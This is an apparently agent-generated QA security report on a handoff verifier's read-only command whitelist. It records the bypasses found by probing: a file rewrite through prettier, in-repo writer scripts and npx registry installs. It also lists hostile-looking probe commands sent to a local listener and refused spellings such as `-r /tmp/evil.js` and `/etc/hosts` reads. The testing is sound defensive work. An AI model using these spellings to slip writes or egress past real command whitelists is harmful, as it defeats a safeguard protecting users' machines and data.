# QA Report: Task 110 - A session-handoff skill that writes the handoff and re-measures it on read

**Task**: [Link to task document](./task.110.session-handoff-skill.md)
**Gate File**: [task.110.gate.7.session-handoff-skill.yml](./task.110.gate.7.session-handoff-skill.yml)
**QA Engineer**: QA Engineer
**Review Date**: 2026-09-15 (cycle 7 — the one extra cycle the operator authorised on resume after the loop-limit halt)
**Testing Completed**: 2026-09-15
**Gate Status**: FAIL

---

## Executive Summary

The cycle-6 fix holds: the npm `--` tail is held to the node `--test`-mode rule, `gh api` refuses
URLs, and the per-spec `patternFlags` path now has the test gate 6 asked for — all three
mutation-proven by QA (each mechanism reverted → a named committed test red). The unscoped safety
re-probe then found the read-only invariant open in a **fourth arm**: `node` and `python3` accept
any relative script with any arguments, so `node node_modules/prettier/bin/prettier.cjs --write
scripts/ugly.js` ran through read mode and **rewrote the file** (executed, verdict `confirmed`,
`git status` → `M`), and the repository's own writers — `registry-tick.js`, `gh-stage.js --stage
done`, `tracker-comment.js`, `generate_catalog.py`, `bundle_skill.py --all` — are one spelling away
from the `npm run` names cycle 2 refused. Two MEDIUM egress findings (`gh <verb> -R <host>/o/r`,
`npm view <url-spec>` — both reached a local listener) and one MEDIUM registry install (`npx
<tool>` fetches and runs a missing tool without a prompt under the runner's non-TTY conditions)
complete the picture. One HIGH with no precondition → FAIL.

**Overall Assessment**: FAIL · **Deployment Recommendation**: BLOCKED (bug.8; bug.9; bug.10)

---

## Testing Scope

### Prerequisites Verified

- [x] Task document exists and complete (status `ready-for-review`)
- [x] All implementation phases completed (4/4 boxes ticked)
- [x] Tests passing (28/28 skill suite; full `ci:fast` exit 0)
- [x] Breaking changes: none declared, none found
- [x] Code on `feature/task.110.session-handoff-skill` with open PR #408 → `develop` (head `b1279afa`)

### Testing Approach

- [x] Automated Testing (skill suite; full hermetic suite via `npm run ci:fast`; `TMPDIR=/tmp` variance run)
- [x] Boundary probing — executed, per `references/probe-boundary-rule.md` (1,377 spellings; 5 executed end-to-end)
- [x] Mutation proofs of the cycle-6 fixes (three mechanisms)
- [x] Security Review (executed write, egress and install probes)
- [x] Code Review (read-only Explore subagent, unscoped, with the SAFETY RE-PROBE directive)
- [x] Regression (live handoff read mode; `quick_validate.py`; prettier via `ci:fast`)

### Review Methodology

Direct tools + one read-only Explore subagent. `code_review_blocking=true` passed by the
`develop-task` orchestrator → high-confidence `category: bug` findings enter `top_issues[]`. Not
lite. Traceability mapper skipped (no Success Criteria table — §9 is a numbered list, as in cycles
1–6).

```
Re-review scope: unscoped (prior gate 6: security FAIL, evidence measured → SAFETY_REPROBE=true)
```

The reviewer's diff was the whole branch **less** the QA artifacts under `docs/tasks/` and the
generated catalog/dependency files (3,702 lines, 12 files) — the artifacts are not code and would
have doubled the read. The subagent **returned at 21m27s**, past the 10-minute budget in
`develop-pipeline-autonomous-defaults.md` §Subagents; it was not killed, because its block arrived
while the direct-tool probes below were still running and before this gate was written (the gate
precondition — no outstanding review — is met). Independence was therefore kept, at the cost of
the budget; recorded rather than hidden.

Step 4b: not applicable this cycle — the change set since gate 6 touches `SKILL.md` (whitelist
rows only; its fenced blocks are `gh` / `command node` invocations previously classified
`no-executable-blocks`, obs #90) and no `shared/resources/*.md` prompt.

---

## Re-Review Context

| Cycle-6 finding | Status | Evidence |
| --- | --- | --- |
| QA-1 (HIGH) npm `--` passthrough forwards any dash token / absolute positional → bug.6 | **FIXED** | `npm run format:check -- --write`, `-- -w`, `npm test -- -r /tmp/evil.js`, `-- --import=…`, `-- --test-reporter=/tmp/x`, `-- /tmp/evil.js`, `-- ../evil.js`, `-- C:/evil.js` refused; `npm test -- skills/session-handoff/tests/`, `-- --test-name-pattern=x` allowed. Mutant (tail back to `POS.ANY` passthrough) → `whitelist: mutating shapes … are refused` red → **covered** |
| QA-2 (MEDIUM) `gh api <url>` → bug.7 | **FIXED** | `gh api https://…`, `//evil/x` refused; `gh api http:127.0.0.1:8099/probe` executed → request went to `api.github.com` (404), not the listener. Mutant (`://` check removed) → same test red → **covered** |
| QA-3 (LOW) `eval:*:cli|sdk` admitted | FIXED | `npm run eval:all:cli`, `eval:foo:sdk` refused; `eval:all`, `eval:develop-next:unit` allowed |
| QA-4 (LOW) drive-letter paths | FIXED | `node C:/tmp/evil.js`, `C:\tmp\evil.js`, `python3 C:/…`, `npm test -- C:/evil.js`, `node --test C:/tmp/` refused |
| QA-5 (LOW) per-spec `patternFlags` untested | FIXED | mutant (`patternFlags: GIT_PATTERN_FLAGS` removed from log/show/blame) → `whitelist: read-only shapes pass` red → **covered** |
| Reviewer cleanups (`--date` one home; comment count; `truncated: false` on the spawn-throw resolve) | FIXED | read |

bug.6 and bug.7 → **Closed** (verified this cycle).

## New Findings This Cycle

- **[high]** `skills/session-handoff/scripts/handoff-verify.mjs:684` (`interpreterRule`) — any relative script, any arguments. **Executed through the verifier's read mode** in a scratch fixture: `node node_modules/prettier/bin/prettier.cjs --write scripts/ugly.js` → verdict `confirmed`, `measured: scripts/ugly.js 26ms`, `git status` → `M scripts/ugly.js`. The same arm reaches the repo's own writers — executed with `--cwd` at the repo root: `node shared/resources/registry-tick.js --file <task.110> --dry-run --json` ran to its decision (`reason: not-accepted · ticked: false`; without `--dry-run` on an accepted task it writes the registry), `node shared/resources/gh-stage.js --help` printed the board mover's usage; `isAllowed()` accepts `gh-stage.js --issue 407 --stage done`, `tracker-comment.js …`, `python3 skills/create-skill/scripts/generate_catalog.py`, `bundle_skill.py --all` — the refused `npm run generate-catalog` / `npm run bundle` one spelling away, and the live handoff's row 33 records "read mode refused" for the npm form. Reviewer CR-3 (high/high) and CR-4 (high/medium) independently → [bug.8](./task.110.bug.8.interpreter-arm-runs-any-in-repo-script-including-writers.md)
- **[medium]** `handoff-verify.mjs:647` — `gh <verb> -R <host>/o/r`, `--repo=https://…` (`--repo` is a `PATTERN_FLAGS` name) and URL positionals (`gh repo view https://evil/o/r`). **Executed**: `gh pr list -R 127.0.0.1:8099/o/r` → `Post "https://127.0.0.1:8099/api/graphql": … server gave HTTP response to HTTPS client`; `--repo=http://127.0.0.1:8099/o/r` → `Post "https://127.0.0.1/api/graphql"`. No token in the default configuration (gh scopes tokens to configured hosts); `GH_ENTERPRISE_TOKEN` would be presented to any non-github.com host — reasoned. Reviewer CR-1 → [bug.9](./task.110.bug.9.gh-and-npm-reach-any-host-through-repo-and-package-specs.md)
- **[medium]** `handoff-verify.mjs:756` — `npm view` / `npm ls` positionals are `POS.ANY` and a package spec may be a URL. **Executed** against a local listener: `npm view http://127.0.0.1:8099/pkg.tgz` → `GET /pkg.tgz`; `npm view git+http://127.0.0.1:8099/x/y.git` → `GET /x/y.git/info/refs?service=git-upload-pack`, `GET /x/y.git/HEAD` (npm ran `git ls-remote`/fetch — the gate-3 PRB-8 primitive through npm). Reviewer CR-2 → bug.9
- **[medium]** `handoff-verify.mjs:864` — `--no-install` optional; the runner is non-TTY with `CI=1`, under which npm 11.17.0 installs a missing package without prompting. **Executed**: `CI=1 npx cowsay@1.6.0 probe </dev/null` → `npm warn exec The following package was not found and will be installed` and ran. Nine of the ten allow-listed tools are absent from this repo's `node_modules/.bin` (only `prettier` is present), so `npx tsc --noEmit` fetches and runs the registry package `tsc` — not TypeScript. Reviewer CR-5 (medium/medium; confirmed high by execution here, severity kept medium: registry-trust, not attacker-chosen code) → [bug.10](./task.110.bug.10.npx-installs-a-missing-tool-from-the-registry.md)
- **[low]** `handoff-verify.mjs:539` — `-w` is in `GH_LIST_VIEW_FLAGS` for `gh run list --workflow`, but on `pr`/`issue`/`repo`/`release`/`workflow view` it is `--web` and opens the reader's browser; SKILL.md says "never `--web`". Reasoned from `gh pr view --help` (`-w, --web`); not executed
- **[low]** `handoff-verify.mjs:225` — after `--`, `checkArgs` applies `POS.ANY` whatever the spec's positional policy: `git diff --no-index -- /etc/hosts scripts/ugly.js` executed and echoed two lines of `/etc/hosts`. Consistency only — the plain readers already read absolute paths by design
- **Probed and refuted** (recorded so the next cycle does not re-run them): `node --test-only <script> --test -r /tmp/evil.js` — node stops option parsing at the script; the marker file was **not** written; `gh api http:127.0.0.1:8099/probe` — no `//`, so gh prefixes the API base (404 from api.github.com); `gh pr list --template '{{exec "x"}}'` — gh's template engine has no `exec`; the all-sink corpus as bare positionals to `git log --`, `gh api`, `node --test`, `npm test --`, `jq .` — inert strings in those positions, and every hostile case is refused as a whole command; `npm view <name>` — a registry read by design; `cat` / `stat` / `grep` on absolute paths — plain readers by design (gate 6's advisory note on the output channel stands)

---

## Implementation Verification

| Phase | Status | Test Result | Notes |
| --- | --- | --- | --- |
| Phase 1: contract (SKILL.md, verdict vocabulary) | CONCERNS | Verified | the whitelist section's "read-only" opening and the `node` row's "everything after a script belongs to the script" describe different guarantees; reconcile with whichever bug.8 fix lands |
| Phase 2: read mode is real (`handoff-verify.mjs`) | **FAIL** | 28/28 unit; boundary broken | cycle-6 fixes hold and are proven; bug.8 (HIGH), bug.9 / bug.10 (MEDIUM) in arms no cycle executed |
| Phase 3: write mode + wiring | PASS | Verified | live handoff: 17 confirmed · 1 stale (the observation queue moved — real drift, correctly reported) · 2 timeouts (by design at `--timeout 20`) |

**Overall Phase Completion**: 1/3 phases passed (phase 1 concerns, phase 2 blocked)

---

## Success Criteria Verification

| Criterion | Target | Actual | Status | Notes |
| --- | --- | --- | --- | --- |
| 1. one verdict per figure; 2026-09-10 fixture → 2 `stale` | Yes | Yes | PASS | fixture test green |
| 2. `--json` follows `reason` / exit-code contract | Yes | Yes | PASS | live run `reason: stale`, exit 0 mirrored |
| 3. fixed section order; traps a pointer | Yes | Yes | PASS | unchanged |
| 4. tests under `npm test` and CI | Yes | Yes | PASS | `npm run ci:fast` exit 0 (`.claude/state/t110-qa7-testlog.txt`) |
| 5. `quick_validate.py`; catalog/deps no diff | Yes | Yes | PASS | validator ✓; tree clean before QA artifacts (report edit excepted) |
| 6. AGENTS.md names read mode | Yes | Yes | PASS | unchanged |
| §10 risk: whitelist of read-only prefixes; anything else `unverifiable` | Read-only | **write via the interpreter arm; egress via `-R` and `npm view`; registry install via `npx`** | **FAIL** | bug.8, bug.9, bug.10 |

Performance: no targets; read mode over the live handoff completes in seconds at `--timeout 20`.
Code quality: prettier ✓ (`ci:fast`); lint N/A (no eslint config in repo).

---

## Breaking Changes Validation

None declared; none found. **PASS**.

---

## Issues Found

### HIGH Severity Issues (1)

**Issue: the `node`/`python3` arm runs any in-repo script with any arguments — installed binaries and the repo's own writers included**
- **Severity**: HIGH · **Category**: Security
- **Bug Report**: [task.110.bug.8](./task.110.bug.8.interpreter-arm-runs-any-in-repo-script-including-writers.md)
- **Observation**: `node node_modules/prettier/bin/prettier.cjs --write scripts/ugly.js` rewrote the file through read mode (executed); `registry-tick.js` reached its write decision under `--dry-run`; `gh-stage.js`, `tracker-comment.js`, `generate_catalog.py`, `bundle_skill.py` accepted
- **Impact**: one committed handoff line mutates the reader's tree, ticks a registry or moves a tracker card on every reader's machine — no attacker file needed, the same precondition bug.6 was rated HIGH on
- **Recommendation**: exact allow-list of read-only in-repo entry points for the script positional (the `NPM_SCRIPTS` discipline), or refuse `node_modules/` / `.bin/` and document the residual trust
- **Priority**: P1

### MEDIUM Severity Issues (3)

**Issue: `gh <verb> -R <host>/o/r` and URL positionals reach any host**
- **Severity**: MEDIUM · **Category**: Security · **Bug Report**: [task.110.bug.9](./task.110.bug.9.gh-and-npm-reach-any-host-through-repo-and-package-specs.md)
- **Observation**: gh POSTed to `https://127.0.0.1:8099/api/graphql` (executed) · **Impact**: egress; `GH_ENTERPRISE_TOKEN` exposure when set · **Recommendation**: drop/constrain `--repo`, anchor positionals · **Priority**: P2

**Issue: `npm view <url-spec>` fetches a tarball or runs `git ls-remote` against any host**
- **Severity**: MEDIUM · **Category**: Security · **Bug Report**: bug.9
- **Observation**: listener received `GET /pkg.tgz` and `GET /x/y.git/info/refs?service=git-upload-pack` (executed) · **Impact**: egress; ssh-agent handshake on a `git+ssh` spec · **Recommendation**: package-name pattern · **Priority**: P2

**Issue: `npx <tool>` installs a missing tool from the registry without a prompt**
- **Severity**: MEDIUM · **Category**: Security · **Bug Report**: [task.110.bug.10](./task.110.bug.10.npx-installs-a-missing-tool-from-the-registry.md)
- **Observation**: `CI=1 npx cowsay@1.6.0 probe </dev/null` installed and ran (executed); 9/10 tools absent locally · **Impact**: registry code executed on the reader's machine; `tsc` on npm is not TypeScript · **Recommendation**: require `--no-install` or inject `--no` · **Priority**: P2

### LOW Severity Issues (2)

- `-w` on `gh … view` is `--web` (opens a browser); admitted for `run list --workflow`. Reasoned
- `--` passthrough uses `POS.ANY` regardless of the spec's positional policy (`git diff --no-index -- /etc/hosts …` executed). Consistency only

**Total Issues**: HIGH: 1, MEDIUM: 3, LOW: 2

---

## NFR Assessment

### Performance — PASS
No hot path; live read mode completes in seconds; cap and timeout bound every child.

### Reliability — PASS
Timeout and truncation report `unverifiable`; no orphaned children after the live run; `TMPDIR=/tmp node --test skills/session-handoff/tests/handoff-verify.test.js` → 28/28 (platform variance).

### Security — FAIL

- **Status**: FAIL
- **Evidence**: measured
- **Probes executed**: 1,377 `isAllowed()` spellings (the all-sink corpus × 8 argument positions + a fresh enumeration across every binary and git subcommand); 5 executed end-to-end (one write through read mode, one dry-run reach, two listener hits, one registry install)
- The cycle-6 shapes are all refused and the three mechanisms are mutation-proven. The failures are in arms no cycle 1–6 executed: cycle 3 called `node x.js --require ./y` "in-repo-trusted" and stopped; no cycle ran an installed binary by path or an in-repo writer by name; `-R` and `npm view` were never tried with a host; `npx` was probed for flags, never for absence

### Maintainability — CONCERNS
SKILL.md's "read-only whitelist" opening and the `node` row's open-ended trust need reconciling with whichever bug.8 fix lands; the per-spec `patternFlags` path is now tested; `handoff-verify.mjs` is 1,719 lines with the specs and the runner in one file (unchanged concern, not a finding).

---

## Code Review

Reviewer: Explore subagent, unscoped (SAFETY RE-PROBE directive), code-only branch diff (3,702 lines, 12 files); returned at 21m27s (over budget, not killed — see Review Methodology). `code_review_blocking=true` → high-confidence bugs promoted. `boundary: true`; `probes_executed: 1377` (QA) — the reviewer additionally executed `gh pr list -R evil.invalid/o/r`, `npm view` against `127.0.0.1:9`, and `CI=1 npx --offline stylelint --version`.

**Correctness bugs (5):**
- [high/high] `handoff-verify.mjs:647` — gh list/view `--repo`/`-R`/URL positionals reach any host → promoted as QA-2 (severity MEDIUM for consistency with bug.7)
- [high/high] `handoff-verify.mjs:756` — `npm view <spec>` accepts tarball/git URLs → promoted as QA-3 (MEDIUM, same class)
- [high/high] `handoff-verify.mjs:692` — `node node_modules/prettier/bin/prettier.cjs --write .` accepted and writes → QA-1 (HIGH; executed by QA)
- [high/medium] `handoff-verify.mjs:684` — in-repo writers reachable under their interpreter spelling (`generate_catalog.py`, `bundle_skill.py --all`, `generate-skill-dependencies.mjs`) → folded into QA-1 / bug.8 (same root cause, one fix)
- [medium/medium] `handoff-verify.mjs:864` — `--no-install` optional; non-TTY `CI=1` installs without prompting → QA-4 (MEDIUM; executed by QA, confidence raised to high)

**Cleanups (0)**.

**Mutation proofs (Step 3c)** — `cp` snapshot, restore from snapshot, baseline 28/28 green between mutations, source restored clean (`git diff --quiet`):
- mutation-proven: npm `--` tail back to `POS.ANY` passthrough → `whitelist: mutating shapes, unknown binaries and shell operators are refused` red → **covered**
- mutation-proven: `gh api` `://` / leading-`//` check removed → `whitelist: mutating shapes … are refused` red → **covered**
- mutation-proven: `patternFlags: GIT_PATTERN_FLAGS` removed from log/show/blame → `whitelist: read-only shapes pass; the \`command \` prefix is stripped` red → **covered** (gate-6 QA-5 closed)

---

## Regression Testing

| Area | Result |
| --- | --- |
| Skill suite `node --test skills/session-handoff/tests/*.test.js` | 28/28 PASS |
| Full fast gate `npm run ci:fast` | exit 0 PASS (`.claude/state/t110-qa7-testlog.txt`) |
| Platform variance `TMPDIR=/tmp …` | 28/28 PASS |
| Live handoff read mode `--timeout 20 --json` | 17 confirmed · 1 stale (observation queue: recorded 25 open / measured `"total": 52` — real drift) · 2 unverifiable (timeouts) PASS |
| `quick_validate.py skills/session-handoff` | ✓ PASS |
| Scratch fixtures | `fx7` (prettier write), `handoff-b.md` (`--cwd` repo root); removed after the run |

---

## Test Artifacts

### Files Reviewed
`skills/session-handoff/scripts/handoff-verify.mjs` (specs, `checkArgs`, `interpreterRule`, `npmRule`, `npxRule`, `ghRule`, `gitRule`, `tokenize`, `isAllowed`, `defaultRunner`), `skills/session-handoff/tests/handoff-verify.test.js`, `skills/session-handoff/SKILL.md`, `.agents/handoff.md`, gate 6 / QA report 6 / bug.6 / bug.7.

### Test Commands Executed
```bash
node --test skills/session-handoff/tests/handoff-verify.test.js          # 28/28
npm run ci:fast                                                          # exit 0
TMPDIR=/tmp node --test skills/session-handoff/tests/handoff-verify.test.js   # 28/28
node <scratch>/probe7.mjs                                                # 1,377 isAllowed() spellings
node skills/session-handoff/scripts/handoff-verify.mjs <fx7>/.agents/handoff.md --timeout 20 --json   # prettier write executed
node skills/session-handoff/scripts/handoff-verify.mjs <scratch>/handoff-b.md --cwd . --timeout 30 --json   # registry-tick / gh-stage reach
gh pr list -R 127.0.0.1:8099/o/r; npm view http://127.0.0.1:8099/pkg.tgz; npm view git+http://127.0.0.1:8099/x/y.git   # listener hits
CI=1 npx cowsay@1.6.0 probe </dev/null                                   # installed without a prompt
node skills/session-handoff/scripts/handoff-verify.mjs .agents/handoff.md --timeout 20 --json   # live regression
python3 skills/create-skill/scripts/quick_validate.py skills/session-handoff
```

### Coverage Report
Not instrumented (node `--test` without `--experimental-test-coverage`); three cycle-6 mechanisms mutation-proven `covered`.

---

## Recommendations

### Immediate Actions (Blocking)
1. bug.8 — allow-list the interpreter arm's script positional by exact path (or refuse `node_modules/` / `.bin/` and document the residual trust); refused-list tests for the four executed spellings; allowed tests for the live handoff's entry points (P1)
2. bug.9 — drop or constrain `--repo`/`-R` and URL positionals on gh list/view; package-name pattern for `npm view`/`ls` (P2)
3. bug.10 — require `--no-install` in the npx arm, or inject `--no` (P2)

### Short-term Actions (Non-Blocking)
1. `-w` only under `run list`; apply the spec's positional policy after `--`
2. Reconcile SKILL.md's "read-only whitelist" opening with the chosen trust boundary for repo-authored scripts

---

## Final Assessment

**Gate Status**: FAIL
**Rationale**: gate rule 1 — one HIGH entry (bug.8, executed write with no precondition); security NFR FAIL (measured). The cycle-6 fixes are closed and proven; the HIGH is a fourth arm, not a regression.
**Quality Score**: 40/100

**Deployment Recommendation**: BLOCKED
**Conditions**: bug.8, bug.9, bug.10 closed

---

**QA Report**: co-located at `task.110.qa.7.session-handoff-skill.md`
**Gate File**: co-located at `task.110.gate.7.session-handoff-skill.yml`
**Next Steps**: this was the one extra cycle the operator authorised after the 5-cycle loop limit; the orchestrator halts on this FAIL and hands the three bug reports to the operator
